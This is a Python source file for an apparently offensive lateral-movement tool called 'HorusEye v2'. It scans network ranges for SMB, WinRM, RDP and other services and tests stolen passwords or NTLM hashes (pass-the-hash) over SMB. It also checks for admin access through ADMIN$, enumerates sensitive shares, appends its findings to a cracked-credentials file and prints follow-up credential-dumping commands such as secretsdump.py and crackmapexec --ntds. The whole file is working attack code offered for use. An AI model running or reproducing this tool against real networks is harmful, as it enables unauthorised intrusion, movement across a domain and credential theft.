"""
HorusEye v2 — Lateral Movement Engine
Auto-maps reachable hosts via SMB/WinRM/RDP after creds obtained
Author: Omar Tamer 🇪🇬
"""

import socket
import threading
import subprocess
import ipaddress
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

EGYPT_RED  = "#E4002B"
EGYPT_GOLD = "#C09A3C"

PROTOCOLS = {
    "smb":   {"port": 445,  "icon": "🗂️",  "label": "SMB"},
    "winrm": {"port": 5985, "icon": "🖥️",  "label": "WinRM"},
    "rdp":   {"port": 3389, "icon": "🖼️",  "label": "RDP"},
    "ssh":   {"port": 22,   "icon": "🔑",  "label": "SSH"},
    "ldap":  {"port": 389,  "icon": "📁",  "label": "LDAP"},
    "mssql": {"port": 1433, "icon": "🗄️",  "label": "MSSQL"},
    "rdg":   {"port": 443,  "icon": "🌐",  "label": "RD Gateway"},
}

INTERESTING_SHARES = ["ADMIN$", "C$", "IPC$", "SYSVOL", "NETLOGON", "backup", "data", "scripts"]


class LateralMovementEngine:
    def __init__(self, console: Console, creds_file: str = "./horuseye_cracked/valid_credentials.txt"):
        self.console = console
        self.creds_file = creds_file
        self.reachable: List[Dict] = []
        self.admin_hosts: List[Dict] = []
        self._lock = threading.Lock()

    def run(self, username: str, password: str, domain: str,
            target_range: str, dc_ip: str = "", ntlm_hash: str = "") -> Dict:
        """Main entry — scan range and test credentials."""

        self.console.print(Rule("[bold red][ 𓂀 LATERAL MOVEMENT ENGINE ][/bold red]"))
        self.console.print()

        self.console.print(Panel(
            f"[bold white]👤 Credentials:[/bold white]  [cyan]{domain}\\{username}[/cyan]\n"
            f"[bold white]🔑 Auth:[/bold white]          [cyan]{'NTLM Hash' if ntlm_hash else 'Password'}[/cyan]\n"
            f"[bold white]🌐 Target Range:[/bold white] [cyan]{target_range}[/cyan]\n"
            f"[bold white]🖥️  DC:[/bold white]            [cyan]{dc_ip or 'Auto-detect'}[/cyan]",
            title="[bold red][ LATERAL MOVEMENT CONFIG ][/bold red]",
            border_style="red", padding=(0, 3)
        ))
        self.console.print()

        # Phase 1: Port scan
        hosts = self._generate_targets(target_range)
        self.console.print(f"[bold yellow]⚡ Phase 1: Scanning {len(hosts)} hosts for open ports...[/bold yellow]")
        live_hosts = self._port_scan(hosts)
        self.console.print(f"  [bold green]✓ {len(live_hosts)} live hosts found[/bold green]\n")

        # Phase 2: Auth test
        self.console.print(f"[bold yellow]⚡ Phase 2: Testing credentials on {len(live_hosts)} hosts...[/bold yellow]")
        auth_results = self._test_credentials(live_hosts, username, password, domain, ntlm_hash)

        # Phase 3: Enumerate admin hosts
        self.console.print(f"\n[bold yellow]⚡ Phase 3: Enumerating admin access...[/bold yellow]")
        self._enumerate_admin_access(auth_results, username, password, domain, ntlm_hash)

        # Phase 4: Share enumeration
        self.console.print(f"\n[bold yellow]⚡ Phase 4: Enumerating accessible shares...[/bold yellow]")
        self._enumerate_shares(auth_results, username, password, domain)

        # Print results
        result = self._print_results(username, domain, target_range)

        # Save to credentials file
        self._save_lateral_results(result, username, domain)

        return result

    def _generate_targets(self, target_range: str) -> List[str]:
        hosts = []
        try:
            if "/" in target_range:
                network = ipaddress.IPv4Network(target_range, strict=False)
                hosts = [str(ip) for ip in network.hosts()]
            elif "-" in target_range:
                # Range like 192.168.1.1-254
                base, end = target_range.rsplit(".", 1)
                start_end = end.split("-")
                for i in range(int(start_end[0]), int(start_end[1]) + 1):
                    hosts.append(f"{base}.{i}")
            else:
                hosts = [target_range]
        except Exception:
            hosts = [target_range]
        return hosts

    def _port_scan(self, hosts: List[str], timeout: float = 0.5) -> List[Dict]:
        live = []
        lock = threading.Lock()

        def check_host(ip):
            open_ports = []
            for proto, info in PROTOCOLS.items():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((ip, info["port"]))
                    sock.close()
                    if result == 0:
                        open_ports.append(proto)
                except Exception:
                    pass
            if open_ports:
                hostname = self._resolve_hostname(ip)
                with lock:
                    live.append({"ip": ip, "hostname": hostname, "protocols": open_ports})

        threads = []
        for ip in hosts:
            t = threading.Thread(target=check_host, args=(ip,))
            threads.append(t)
            t.start()
            if len(threads) >= 100:
                for t in threads:
                    t.join()
                threads = []

        for t in threads:
            t.join()

        return live

    def _test_credentials(self, hosts: List[Dict], username: str, password: str,
                           domain: str, ntlm_hash: str = "") -> List[Dict]:
        results = []
        for host in hosts:
            if "smb" not in host.get("protocols", []):
                host["auth"] = "no_smb"
                results.append(host)
                continue

            auth_result = self._smb_auth_test(host["ip"], username, password, domain, ntlm_hash)
            host["auth"] = auth_result
            if auth_result in ["success", "admin"]:
                with self._lock:
                    self.reachable.append(host)
            results.append(host)
        return results

    def _smb_auth_test(self, ip: str, username: str, password: str,
                        domain: str, ntlm_hash: str = "") -> str:
        try:
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(ip, ip, timeout=5)
            if ntlm_hash:
                conn.login(username, "", domain, lmhash="", nthash=ntlm_hash)
            else:
                conn.login(username, password, domain)
            conn.logoff()
            return "success"
        except ImportError:
            return self._cme_auth_test(ip, username, password, domain)
        except Exception as e:
            err = str(e).lower()
            if "logon_failure" in err or "wrong" in err:
                return "wrong_creds"
            elif "locked" in err:
                return "locked"
            elif "access_denied" in err:
                return "no_admin"
            return "error"

    def _cme_auth_test(self, ip: str, username: str, password: str, domain: str) -> str:
        """Fallback using crackmapexec if impacket not available."""
        try:
            result = subprocess.run(
                ["crackmapexec", "smb", ip, "-u", username, "-p", password, "-d", domain],
                capture_output=True, text=True, timeout=10
            )
            output = result.stdout + result.stderr
            if "Pwn3d!" in output:
                return "admin"
            elif "[+]" in output:
                return "success"
            elif "[-]" in output:
                return "wrong_creds"
        except Exception:
            pass
        return "error"

    def _enumerate_admin_access(self, hosts: List[Dict], username: str,
                                  password: str, domain: str, ntlm_hash: str):
        for host in hosts:
            if host.get("auth") not in ["success", "admin"]:
                continue
            try:
                from impacket.smbconnection import SMBConnection
                conn = SMBConnection(host["ip"], host["ip"], timeout=5)
                if ntlm_hash:
                    conn.login(username, "", domain, lmhash="", nthash=ntlm_hash)
                else:
                    conn.login(username, password, domain)

                # Try to access ADMIN$ — indicates local admin
                try:
                    conn.listPath("ADMIN$", "*")
                    host["is_admin"] = True
                    with self._lock:
                        if host not in self.admin_hosts:
                            self.admin_hosts.append(host)
                except Exception:
                    host["is_admin"] = False
                conn.logoff()
            except Exception:
                host["is_admin"] = False

    def _enumerate_shares(self, hosts: List[Dict], username: str,
                           password: str, domain: str):
        for host in hosts:
            if host.get("auth") not in ["success", "admin"]:
                continue
            try:
                from impacket.smbconnection import SMBConnection
                conn = SMBConnection(host["ip"], host["ip"], timeout=5)
                conn.login(username, password, domain)
                shares = conn.listShares()
                accessible = []
                for share in shares:
                    sname = share["shi1_netname"].split("\x00")[0]
                    try:
                        conn.listPath(sname, "*")
                        accessible.append(sname)
                    except Exception:
                        pass
                host["shares"] = accessible

                # Flag interesting shares
                interesting = [s for s in accessible if
                               any(i.lower() in s.lower() for i in INTERESTING_SHARES)]
                if interesting:
                    host["interesting_shares"] = interesting

                conn.logoff()
            except Exception:
                host["shares"] = []

    def _print_results(self, username: str, domain: str, target_range: str) -> Dict:
        total = len(self.reachable)
        admin_count = len(self.admin_hosts)

        self.console.print(Panel(
            f"[bold white]🌐 Range Scanned:[/bold white]  [cyan]{target_range}[/cyan]\n"
            f"[bold white]✅ Auth Success:[/bold white]  [bold green]{total} hosts[/bold green]\n"
            f"[bold red]💀 Admin Access:[/bold red]   [bold red]{admin_count} hosts[/bold red]",
            title="[bold red][ LATERAL MOVEMENT RESULTS ][/bold red]",
            border_style="red", padding=(0, 3)
        ))
        self.console.print()

        if self.reachable:
            t = Table(box=box.SIMPLE, show_header=True, title="🌐 Reachable Hosts")
            t.add_column("IP", style="cyan")
            t.add_column("Hostname", style="white")
            t.add_column("Protocols", style="dim")
            t.add_column("Admin?", justify="center")
            t.add_column("Shares", style="yellow")

            for host in self.reachable:
                protos = " ".join(PROTOCOLS[p]["icon"] for p in host.get("protocols", []))
                admin = "[bold red]💀 YES[/bold red]" if host.get("is_admin") else "[dim]No[/dim]"
                shares = ", ".join(host.get("interesting_shares", []))[:30] or "-"
                t.add_row(host["ip"], host.get("hostname", ""), protos, admin, shares)

            self.console.print(t)
            self.console.print()

        # Next steps for admin hosts
        if self.admin_hosts:
            self.console.print(Panel(
                "[bold yellow]⚡ NEXT STEPS — Admin access found:[/bold yellow]\n\n" +
                "\n".join([
                    f"[cyan]# Dump credentials from {h['ip']}[/cyan]",
                    f"crackmapexec smb {h['ip']} -u {username} -p 'PASS' --lsa",
                    f"crackmapexec smb {h['ip']} -u {username} -p 'PASS' --ntds",
                    f"secretsdump.py {domain}/{username}:PASS@{h['ip']}",
                    ""
                ] for h in self.admin_hosts[:2])[:8],
                border_style="yellow", padding=(1, 2)
            ))

        return {
            "reachable": self.reachable,
            "admin_hosts": self.admin_hosts,
            "total_reachable": total,
            "total_admin": admin_count
        }

    def _resolve_hostname(self, ip: str) -> str:
        try:
            return socket.gethostbyaddr(ip)[0].split(".")[0]
        except Exception:
            return ""

    def _save_lateral_results(self, result: Dict, username: str, domain: str):
        """Append lateral movement findings to valid_credentials.txt."""
        import os
        creds_dir = os.path.dirname(self.creds_file)
        if creds_dir:
            os.makedirs(creds_dir, exist_ok=True)

        with open(self.creds_file, "a") as f:
            f.write(f"\n# Lateral Movement — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Credentials used: {domain}\\{username}\n")
            f.write(f"# Admin access on {result['total_admin']} hosts:\n")
            for host in result.get("admin_hosts", []):
                f.write(f"ADMIN:{host['ip']}:{host.get('hostname','')}:{domain}\\{username}\n")
            f.write(f"# Reachable hosts: {result['total_reachable']}\n")

        self.console.print(f"[bold green]💾 Lateral movement results → [cyan]{self.creds_file}[/cyan][/bold green]")
